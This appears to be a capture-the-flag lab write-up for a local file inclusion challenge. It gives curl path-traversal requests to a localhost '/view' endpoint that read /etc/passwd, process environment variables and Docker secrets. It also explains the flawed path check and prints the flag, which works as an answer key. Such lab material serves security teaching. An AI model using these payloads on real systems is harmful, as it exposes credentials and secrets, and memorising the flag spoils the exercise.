# Challenge 1: Local File Inclusion (LFI)

## Objective
Break out of the `/app/documents` directory and read sensitive system files.

## Vulnerability Details
The `/view` endpoint has insufficient path validation. It checks for allowed characters but doesn't properly validate the final resolved path, allowing directory traversal attacks.

## Exploitation Steps

1. **Read /etc/passwd**
   ```
   curl http://localhost:5000/view?file=../../../../etc/passwd
   ```

2. **Read environment variables**
   ```
   curl http://localhost:5000/view?file=../../../../proc/self/environ
   ```

3. **Read Docker secrets (if mounted)**
   ```
   curl http://localhost:5000/view?file=../../../../run/secrets/docker_secret
   ```

## Flag 1 Location
Once you read `/etc/passwd`, look for the `ctf` user entry. The flag will contain:
`CTF{LFI_PATH_TRAVERSAL_VULN_DISCOVERED}`

## Key Insights
- The `realpath()` check happens AFTER path joining
- Path traversal sequences (../) are not blocked
- The directory prefix check uses string comparison, not true path resolution
